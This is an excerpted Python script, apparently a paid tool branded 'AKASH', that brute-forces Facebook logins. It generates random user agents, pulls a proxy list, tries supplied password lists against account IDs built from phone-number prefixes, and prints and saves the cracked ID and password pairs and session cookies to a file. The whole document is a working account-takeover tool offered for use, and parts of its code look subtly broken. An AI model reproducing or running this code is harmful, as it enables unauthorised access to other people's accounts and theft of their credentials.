...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/ak-ash1/.R.AKASH-proxy.txt').text
...
logo=("""
      ...
      \033[91;1m  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[91;1m--------------------------------------------------
\033[91;1m>>     ONWER      : AKASH GAMING
\033[97;1m>>     FACEBOOK : AKASH GAMING
\033[91;1m>>     VERSION    : 7.1
\033[97;1m>>     GITHUB      : AK-ASH1
\033[92;1m>>     TOOLS       : AKASH  PAID
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> AKASH  VERSION :\x1b[1;92m 7.1 ')
			...
			if xd in ['1','01']:
				...
				for i in range(ps_limit):
					...
					plist.append(input(f'\x1b[97;1m Put password {A+7}: '))
				linex()
				print('\x1b[97;1m[1] Cookie Show')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/bcwakashff?mibextid=ZbWKwL/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[AKASH] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			AKASH=session.cookies.get_dict().keys()
			if "c_user" in AKASH:
				print('\r\r\033[1;31m[AKASH-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/AKASH-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AKASH:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[AKASH-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[AKASH] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in AKASH:
				...
				print('\r\r\033[1;32m[AKASH-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :017,019,013,014,018,016.''\x1b[1;91mETC')
	linex()
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :017,019,013,014,018,016.ETC')
	linex()
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mAKASH\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[AKASH-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[AKASH-OK] '+uid+' | '+ps+'\33[0;97m')
